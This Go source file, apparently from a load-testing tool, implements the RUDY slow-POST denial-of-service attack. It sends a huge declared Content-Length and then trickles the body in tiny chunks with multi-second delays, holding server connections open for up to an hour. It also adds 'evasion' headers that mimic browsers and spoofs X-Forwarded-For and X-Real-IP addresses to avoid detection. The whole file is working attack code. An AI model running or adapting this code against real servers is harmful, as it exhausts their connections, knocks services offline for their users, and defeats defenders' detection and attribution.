package strategy

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/srtdog64/loadtestforge/internal/httpdata"
	"github.com/srtdog64/loadtestforge/internal/netutil"
)

// RUDYConfig holds configuration for RUDY attack.
type RUDYConfig struct {
	ContentLength         int
	ChunkDelayMin         time.Duration
	ChunkDelayMax         time.Duration
	ChunkSizeMin          int
	ChunkSizeMax          int
	PersistConnections    bool
	MaxRequestsPerSession int
	KeepAliveTimeout      time.Duration
	SessionLifetime       time.Duration
	UseJSON               bool
	UseMultipart          bool
	RandomizePath         bool
	EvasionLevel          int
	ConnectTimeout        time.Duration
	SendBufferSize        int
}

// DefaultRUDYConfig returns sensible defaults for RUDY attack.
func DefaultRUDYConfig() RUDYConfig {
	return RUDYConfig{
		ContentLength:         1000000,
		ChunkDelayMin:         1 * time.Second,
		ChunkDelayMax:         5 * time.Second,
		ChunkSizeMin:          1,
		ChunkSizeMax:          100,
		PersistConnections:    true,
		MaxRequestsPerSession: 10,
		KeepAliveTimeout:      600 * time.Second,
		SessionLifetime:       3600 * time.Second,
		UseJSON:               false,
		UseMultipart:          false,
		RandomizePath:         false,
		EvasionLevel:          2,
		ConnectTimeout:        10 * time.Second,
		SendBufferSize:        1024,
	}
}

// RUDYSession represents a persistent session with cookies and state.
type RUDYSession struct {
	SessionID    string
	Cookies      []string
	LastActivity time.Time
	RequestCount int
	FormData     map[string]string
	UserAgent    string
	Referer      string
	ContentType  string
	CreatedAt    time.Time
	mu           sync.Mutex
}

// NewRUDYSession creates a new session with randomized properties.
func NewRUDYSession(path string) *RUDYSession {
	sessionID := httpdata.GenerateSessionID()
	formType := httpdata.DetectFormType(path)

	return &RUDYSession{
		SessionID:    sessionID,
		Cookies:      []string{fmt.Sprintf("SESSIONID=%s", sessionID), fmt.Sprintf("PHPSESSID=%s", sessionID)},
		LastActivity: time.Now(),
		RequestCount: 0,
		FormData:     generateFormData(formType),
		UserAgent:    httpdata.RandomUserAgent(),
		Referer:      httpdata.RandomFormReferer(formType),
		ContentType:  "application/x-www-form-urlencoded",
		CreatedAt:    time.Now(),
	}
}

// AddCookie adds a cookie if not already present.
func (s *RUDYSession) AddCookie(cookie string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, c := range s.Cookies {
		if c == cookie {
			return
		}
	}
	s.Cookies = append(s.Cookies, cookie)
}

// GetCookies returns a copy of cookies.
func (s *RUDYSession) GetCookies() []string {
	s.mu.Lock()
	defer s.mu.Unlock()

	result := make([]string, len(s.Cookies))
	copy(result, s.Cookies)
	return result
}

func generateFormData(formType httpdata.FormType) map[string]string {
	data := make(map[string]string)
	fieldCount := rand.Intn(6) + 3

	for i := 0; i < fieldCount; i++ {
		var fieldName, value string

		switch i {
		case 0:
			fieldName = "username"
			value = fmt.Sprintf("user%d", rand.Intn(9000)+1000)
		case 1:
			fieldName = "email"
			value = fmt.Sprintf("user%d@example.com", rand.Intn(9000)+1000)
		case 2:
			fieldName = "password"
			value = generateRandomString(rand.Intn(8) + 8)
		default:
			fieldNames := []string{"message", "comment", "content", "body", "text", "data", "input"}
			fieldName = fieldNames[rand.Intn(len(fieldNames))]
			wordCount := rand.Intn(40) + 10
			words := make([]string, wordCount)
			for j := range words {
				words[j] = "test"
			}
			value = strings.Join(words, " ")
		}

		data[fieldName] = value
	}

	return data
}

func generateRandomString(length int) string {
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

// RUDYSessionManager manages session persistence and reuse.
type RUDYSessionManager struct {
	sessions      map[string]*RUDYSession
	mu            sync.RWMutex
	maxSessions   int
	sessionExpiry time.Duration
}

// NewRUDYSessionManager creates a new session manager.
func NewRUDYSessionManager(maxSessions int, expiry time.Duration) *RUDYSessionManager {
	return &RUDYSessionManager{
		sessions:      make(map[string]*RUDYSession),
		maxSessions:   maxSessions,
		sessionExpiry: expiry,
	}
}

// GetSession retrieves an existing session or returns nil.
func (m *RUDYSessionManager) GetSession(idx int) *RUDYSession {
	sessionKey := fmt.Sprintf("session_%d", idx%100)

	m.mu.RLock()
	session, exists := m.sessions[sessionKey]
	m.mu.RUnlock()

	if !exists {
		return nil
	}

	if time.Since(session.LastActivity) > m.sessionExpiry {
		m.mu.Lock()
		delete(m.sessions, sessionKey)
		m.mu.Unlock()
		return nil
	}

	return session
}

// StoreSession stores a session for reuse.
func (m *RUDYSessionManager) StoreSession(session *RUDYSession) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if len(m.sessions) >= m.maxSessions {
		var oldestKey string
		var oldestTime time.Time
		first := true

		for key, sess := range m.sessions {
			if first || sess.LastActivity.Before(oldestTime) {
				oldestKey = key
				oldestTime = sess.LastActivity
				first = false
			}
		}

		if oldestKey != "" {
			delete(m.sessions, oldestKey)
		}
	}

	sessionKey := fmt.Sprintf("session_%d", hash(session.SessionID)%100)
	m.sessions[sessionKey] = session
}

// CleanupExpired removes expired sessions.
func (m *RUDYSessionManager) CleanupExpired() int {
	m.mu.Lock()
	defer m.mu.Unlock()

	var expiredKeys []string
	now := time.Now()

	for key, session := range m.sessions {
		if now.Sub(session.LastActivity) > m.sessionExpiry {
			expiredKeys = append(expiredKeys, key)
		}
	}

	for _, key := range expiredKeys {
		delete(m.sessions, key)
	}

	return len(expiredKeys)
}

func hash(s string) int {
	h := 0
	for _, c := range s {
		h = 31*h + int(c)
	}
	if h < 0 {
		h = -h
	}
	return h
}

// RUDYStats tracks detailed statistics.
type RUDYStats struct {
	Active           int64
	Created          int64
	Errors           int64
	RequestsSent     int64
	BytesSent        int64
	ChunksSent       int64
	SessionsCreated  int64
	SessionsReused   int64
	Timeouts         int64
	Reconnects       int64
	CookiesReceived  int64

	chunkTimings     []float64
	sessionDurations []float64
	errorTypes       map[string]int64
	errorSamples     []string
	mu               sync.Mutex
	maxSamples       int
}

// NewRUDYStats creates a new stats tracker.
func NewRUDYStats() *RUDYStats {
	return &RUDYStats{
		chunkTimings:     make([]float64, 0, 10000),
		sessionDurations: make([]float64, 0, 1000),
		errorTypes:       make(map[string]int64),
		errorSamples:     make([]string, 0, 100),
		maxSamples:       100,
	}
}

// RecordError records an error with context.
func (s *RUDYStats) RecordError(err error, context string, details string) {
	atomic.AddInt64(&s.Errors, 1)

	s.mu.Lock()
	defer s.mu.Unlock()

	errorKey := fmt.Sprintf("%s:%T", context, err)
	s.errorTypes[errorKey]++

	if len(s.errorSamples) < s.maxSamples {
		timestamp := time.Now().Format("15:04:05")
		errMsg := err.Error()
		if len(errMsg) > 150 {
			errMsg = errMsg[:150]
		}
		if details != "" {
			errMsg = details + " - " + errMsg
		}
		s.errorSamples = append(s.errorSamples, fmt.Sprintf("[%s] %s: %s", timestamp, errorKey, errMsg))
	}
}

// RecordChunkTiming records chunk sending timing.
func (s *RUDYStats) RecordChunkTiming(timing time.Duration) {
	s.mu.Lock()
	defer s.mu.Unlock()

	s.chunkTimings = append(s.chunkTimings, timing.Seconds())
	if len(s.chunkTimings) > 10000 {
		s.chunkTimings = s.chunkTimings[len(s.chunkTimings)-10000:]
	}
}

// RecordSessionDuration records session duration.
func (s *RUDYStats) RecordSessionDuration(duration time.Duration) {
	s.mu.Lock()
	defer s.mu.Unlock()

	s.sessionDurations = append(s.sessionDurations, duration.Seconds())
	if len(s.sessionDurations) > 1000 {
		s.sessionDurations = s.sessionDurations[len(s.sessionDurations)-1000:]
	}
}

// GetTimingStats returns timing statistics (avg, p95, p99).
func (s *RUDYStats) GetTimingStats() (avg, p95, p99 float64) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if len(s.chunkTimings) == 0 {
		return 0, 0, 0
	}

	sorted := make([]float64, len(s.chunkTimings))
	copy(sorted, s.chunkTimings)

	for i := 0; i < len(sorted)-1; i++ {
		for j := i + 1; j < len(sorted); j++ {
			if sorted[i] > sorted[j] {
				sorted[i], sorted[j] = sorted[j], sorted[i]
			}
		}
	}

	sum := 0.0
	for _, t := range sorted {
		sum += t
	}
	avg = sum / float64(len(sorted))

	p95Idx := int(float64(len(sorted)) * 0.95)
	p99Idx := int(float64(len(sorted)) * 0.99)

	if p95Idx >= len(sorted) {
		p95Idx = len(sorted) - 1
	}
	if p99Idx >= len(sorted) {
		p99Idx = len(sorted) - 1
	}

	p95 = sorted[p95Idx]
	p99 = sorted[p99Idx]

	return avg, p95, p99
}

// GetAvgSessionDuration returns average session duration.
func (s *RUDYStats) GetAvgSessionDuration() float64 {
	s.mu.Lock()
	defer s.mu.Unlock()

	if len(s.sessionDurations) == 0 {
		return 0
	}

	sum := 0.0
	for _, d := range s.sessionDurations {
		sum += d
	}
	return sum / float64(len(s.sessionDurations))
}

// RUDY implements the R-U-Dead-Yet slow POST attack.
type RUDY struct {
	BaseStrategy
	config         RUDYConfig
	sessionManager *RUDYSessionManager
	stats          *RUDYStats
	formGenerator  *httpdata.FormDataGenerator
}

// NewRUDY creates a new RUDY attack strategy.
func NewRUDY(cfg RUDYConfig, bindIP string) *RUDY {
	formGen := httpdata.NewFormDataGenerator()
	formGen.UseJSON = cfg.UseJSON
	formGen.UseMultipart = cfg.UseMultipart
	formGen.FieldCount = 5

	common := CommonConfig{
		ConnectTimeout:    cfg.ConnectTimeout,
		SessionLifetime:   cfg.SessionLifetime,
		KeepAliveInterval: cfg.KeepAliveTimeout,
		EnableStealth:     cfg.EvasionLevel >= 2,
		RandomizePath:     cfg.RandomizePath,
	}

	return &RUDY{
		BaseStrategy:   NewBaseStrategy(bindIP, common),
		config:         cfg,
		sessionManager: NewRUDYSessionManager(1000, cfg.SessionLifetime),
		stats:          NewRUDYStats(),
		formGenerator:  formGen,
	}
}

// Execute performs a single RUDY attack cycle.
func (r *RUDY) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := netutil.ParseTargetURL(target.URL)
	if err != nil {
		return err
	}

	conn, err := r.dialWithOptions(ctx, host, useTLS, parsedURL.Hostname())
	if err != nil {
		r.stats.RecordError(err, "connect", fmt.Sprintf("Failed to connect to %s", host))
		return err
	}

	r.IncrementConnections()
	atomic.AddInt64(&r.stats.Created, 1)
	connectionStartTime := time.Now()

	defer func() {
		conn.Close()
		r.DecrementConnections()
		r.stats.RecordSessionDuration(time.Since(connectionStartTime))
	}()

	session := r.getOrCreateSession(parsedURL.Path)

	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		if err := r.executeRequest(ctx, conn, parsedURL, session); err != nil {
			return err
		}

		session.RequestCount++
		session.LastActivity = time.Now()
		atomic.AddInt64(&r.stats.RequestsSent, 1)

		// Read response and parse cookies
		if r.config.PersistConnections {
			r.readResponseAndParseCookies(conn, session)
		}

		// Check max requests limit (0 = unlimited, hold until server closes)
		if r.config.MaxRequestsPerSession > 0 && session.RequestCount >= r.config.MaxRequestsPerSession {
			if r.config.PersistConnections {
				r.sessionManager.StoreSession(session)
			}
			return nil
		}

		if !r.config.PersistConnections {
			return nil
		}

		// Quick reconnect delay (matching Python: 0.05~0.2s)
		waitTime := time.Duration(rand.Int63n(150*int64(time.Millisecond))) + 50*time.Millisecond
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(waitTime):
		}
	}
}

func (r *RUDY) dialWithOptions(ctx context.Context, host string, useTLS bool, hostname string) (net.Conn, error) {
	dialer := &net.Dialer{
		Timeout:   r.config.ConnectTimeout,
		KeepAlive: 60 * time.Second,
		LocalAddr: r.GetLocalAddr(),
	}

	dialCtx, cancel := context.WithTimeout(ctx, r.config.ConnectTimeout)
	defer cancel()

	var conn net.Conn
	var err error

	if useTLS {
		conn, err = netutil.DialTLS(dialCtx, host, hostname, dialer)
	} else {
		conn, err = dialer.DialContext(dialCtx, "tcp", host)
	}

	if err != nil {
		return nil, err
	}

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(false)
		tcpConn.SetWriteBuffer(r.config.SendBufferSize)
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(60 * time.Second)
	}

	return conn, nil
}

func (r *RUDY) getOrCreateSession(path string) *RUDYSession {
	idx := rand.Intn(100)
	session := r.sessionManager.GetSession(idx)

	if session != nil {
		atomic.AddInt64(&r.stats.SessionsReused, 1)
		return session
	}

	atomic.AddInt64(&r.stats.SessionsCreated, 1)
	return NewRUDYSession(path)
}

func (r *RUDY) executeRequest(ctx context.Context, conn net.Conn, parsedURL *url.URL, session *RUDYSession) error {
	path := r.selectPath(parsedURL)

	headers := r.buildHeaders(parsedURL, session)
	request := r.buildRequest(path, headers)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(request)); err != nil {
		r.stats.RecordError(err, "sendHeaders", "Failed to send request headers")
		return err
	}

	return r.sendBodySlowly(ctx, conn, session)
}

func (r *RUDY) selectPath(parsedURL *url.URL) string {
	if r.config.RandomizePath && rand.Float32() < 0.3 {
		return httpdata.RandomFormEndpoint()
	}
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}
	return path
}

func (r *RUDY) buildHeaders(parsedURL *url.URL, session *RUDYSession) []string {
	charset := httpdata.RandomCharset()
	contentType := session.ContentType
	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
		contentType = fmt.Sprintf("%s; charset=%s", contentType, charset)
	}

	headers := []string{
		fmt.Sprintf("Host: %s", parsedURL.Host),
		fmt.Sprintf("User-Agent: %s", session.UserAgent),
		fmt.Sprintf("Accept: %s", httpdata.RandomAccept()),
		fmt.Sprintf("Accept-Language: %s", httpdata.RandomAcceptLanguage()),
		"Accept-Encoding: identity",
		fmt.Sprintf("Referer: %s", session.Referer),
		fmt.Sprintf("Content-Type: %s", contentType),
		fmt.Sprintf("Content-Length: %d", r.config.ContentLength),
		"Cache-Control: no-cache",
		"Pragma: no-cache",
	}

	if r.config.PersistConnections {
		headers = append(headers, "Connection: keep-alive")
		headers = append(headers, fmt.Sprintf("Keep-Alive: timeout=%d, max=100", int(r.config.KeepAliveTimeout.Seconds())))
	} else {
		headers = append(headers, "Connection: close")
	}

	cookies := session.GetCookies()
	if len(cookies) > 0 {
		headers = append(headers, fmt.Sprintf("Cookie: %s", strings.Join(cookies, "; ")))
	}

	if rand.Float32() < 0.3 {
		headers = append(headers, fmt.Sprintf("X-Forwarded-For: %s", httpdata.RandomFakeIP()))
	}

	if rand.Float32() < 0.2 {
		headers = append(headers, fmt.Sprintf("X-Real-IP: %s", httpdata.RandomFakeIP()))
	}

	if rand.Float32() < 0.4 {
		headers = append(headers, fmt.Sprintf("Origin: https://%s", parsedURL.Host))
	}

	if rand.Float32() < 0.5 {
		headers = append(headers, fmt.Sprintf("X-CSRF-Token: %s", httpdata.GenerateSessionID()))
		headers = append(headers, "X-Requested-With: XMLHttpRequest")
	}

	if r.config.EvasionLevel >= 2 {
		headers = append(headers, r.generateEvasionHeaders()...)
	}

	return headers
}

func (r *RUDY) generateEvasionHeaders() []string {
	var headers []string

	if r.config.EvasionLevel >= 2 {
		extraHeaders := []string{
			"DNT: 1",
			"Upgrade-Insecure-Requests: 1",
			"Sec-Fetch-Dest: document",
			"Sec-Fetch-Mode: navigate",
			fmt.Sprintf("Sec-Fetch-Site: %s", httpdata.RandomSecFetchSite()),
			"Sec-Fetch-User: ?1",
		}

		count := rand.Intn(3) + 2
		perm := rand.Perm(len(extraHeaders))
		for i := 0; i < count && i < len(perm); i++ {
			headers = append(headers, extraHeaders[perm[i]])
		}
	}

	if r.config.EvasionLevel >= 3 {
		chromeVer := httpdata.RandomChromeVersion()
		sophisticatedHeaders := []string{
			fmt.Sprintf(`Sec-CH-UA: "Chromium";v="%s", "Google Chrome";v="%s", "Not-A.Brand";v="99"`, chromeVer, chromeVer),
			fmt.Sprintf("Sec-CH-UA-Mobile: %s", httpdata.RandomMobile()),
			fmt.Sprintf(`Sec-CH-UA-Platform: "%s"`, httpdata.RandomPlatform()),
			fmt.Sprintf("X-Request-ID: %s", httpdata.GenerateSessionID()),
			"TE: Trailers",
		}

		count := rand.Intn(3) + 1
		perm := rand.Perm(len(sophisticatedHeaders))
		for i := 0; i < count && i < len(perm); i++ {
			headers = append(headers, sophisticatedHeaders[perm[i]])
		}
	}

	return headers
}

func (r *RUDY) buildRequest(path string, headers []string) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("POST %s?r=%d HTTP/1.1\r\n", path, rand.Intn(100000)))
	for _, h := range headers {
		sb.WriteString(h)
		sb.WriteString("\r\n")
	}
	sb.WriteString("\r\n")
	return sb.String()
}

func (r *RUDY) sendBodySlowly(ctx context.Context, conn net.Conn, session *RUDYSession) error {
	formData := r.encodeFormData(session.FormData)
	fullData := r.prepareFullData(formData)

	offset := 0
	chunkIndex := 0

	for offset < len(fullData) {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		if chunkIndex > 0 {
			delay := r.randomDelay()
			select {
			case <-ctx.Done():
				return nil
			case <-time.After(delay):
			}
		}

		chunkSize := rand.Intn(r.config.ChunkSizeMax-r.config.ChunkSizeMin+1) + r.config.ChunkSizeMin
		if offset+chunkSize > len(fullData) {
			chunkSize = len(fullData) - offset
		}

		chunk := fullData[offset : offset+chunkSize]

		startTime := time.Now()
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))

		_, err := conn.Write(chunk)
		timing := time.Since(startTime)

		if err != nil {
			r.stats.RecordError(err, "sendChunk", fmt.Sprintf("Failed to send chunk %d", chunkIndex))
			return err
		}

		r.stats.RecordChunkTiming(timing)
		atomic.AddInt64(&r.stats.ChunksSent, 1)
		atomic.AddInt64(&r.stats.BytesSent, int64(chunkSize))

		offset += chunkSize
		chunkIndex++
	}

	return nil
}

// readResponseAndParseCookies reads the HTTP response and extracts Set-Cookie headers.
func (r *RUDY) readResponseAndParseCookies(conn net.Conn, session *RUDYSession) {
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	reader := bufio.NewReader(conn)

	// Read status line
	statusLine, err := reader.ReadString('\n')
	if err != nil {
		if err != io.EOF {
			atomic.AddInt64(&r.stats.Timeouts, 1)
		}
		return
	}

	// Check for valid HTTP response
	if !strings.HasPrefix(statusLine, "HTTP/") {
		return
	}

	// Read headers until empty line
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			break
		}

		// Parse Set-Cookie header
		if strings.HasPrefix(strings.ToLower(line), "set-cookie:") {
			cookieValue := strings.TrimSpace(line[11:])
			// Extract just the cookie name=value part (before any attributes)
			if idx := strings.Index(cookieValue, ";"); idx != -1 {
				cookieValue = cookieValue[:idx]
			}
			session.AddCookie(cookieValue)
			atomic.AddInt64(&r.stats.CookiesReceived, 1)
		}
	}

	// Drain any remaining body to keep connection clean
	io.Copy(io.Discard, io.LimitReader(reader, 4096))
}

func (r *RUDY) encodeFormData(data map[string]string) []byte {
	if r.config.UseJSON {
		return r.encodeJSON(data)
	}
	if r.config.UseMultipart {
		return r.encodeMultipart(data)
	}
	return r.encodeURLEncoded(data)
}

func (r *RUDY) encodeURLEncoded(data map[string]string) []byte {
	var parts []string
	for k, v := range data {
		parts = append(parts, url.QueryEscape(k)+"="+url.QueryEscape(v))
	}
	return []byte(strings.Join(parts, "&"))
}

func (r *RUDY) encodeJSON(data map[string]string) []byte {
	var sb strings.Builder
	sb.WriteString("{")
	first := true
	for k, v := range data {
		if !first {
			sb.WriteString(",")
		}
		sb.WriteString(fmt.Sprintf(`"%s":"%s"`, k, v))
		first = false
	}
	sb.WriteString("}")
	return []byte(sb.String())
}

func (r *RUDY) encodeMultipart(data map[string]string) []byte {
	boundary := fmt.Sprintf("----WebKitFormBoundary%s", httpdata.GenerateSessionID()[:16])
	var sb strings.Builder

	for k, v := range data {
		sb.WriteString("--")
		sb.WriteString(boundary)
		sb.WriteString("\r\n")
		sb.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"%s\"\r\n\r\n", k))
		sb.WriteString(v)
		sb.WriteString("\r\n")
	}

	sb.WriteString("--")
	sb.WriteString(boundary)
	sb.WriteString("--\r\n")

	return []byte(sb.String())
}

func (r *RUDY) prepareFullData(formData []byte) []byte {
	if len(formData) >= r.config.ContentLength {
		return formData[:r.config.ContentLength]
	}

	fullData := make([]byte, r.config.ContentLength)
	copy(fullData, formData)

	// Varied filler patterns to look realistic (matching Python implementation)
	fillerPatterns := [][]byte{
		[]byte("A"),
		[]byte("&x="),
		[]byte("%20"),
		[]byte("0"),
		[]byte("data"),
	}

	i := len(formData)
	for i < r.config.ContentLength {
		pattern := fillerPatterns[rand.Intn(len(fillerPatterns))]
		for _, b := range pattern {
			if i >= r.config.ContentLength {
				break
			}
			fullData[i] = b
			i++
		}
	}

	return fullData
}

func (r *RUDY) randomDelay() time.Duration {
	minNano := r.config.ChunkDelayMin.Nanoseconds()
	maxNano := r.config.ChunkDelayMax.Nanoseconds()
	return time.Duration(rand.Int63n(maxNano-minNano+1) + minNano)
}

// Name returns the strategy name.
func (r *RUDY) Name() string {
	return "rudy"
}

// Stats returns the detailed statistics.
func (r *RUDY) Stats() *RUDYStats {
	return r.stats
}
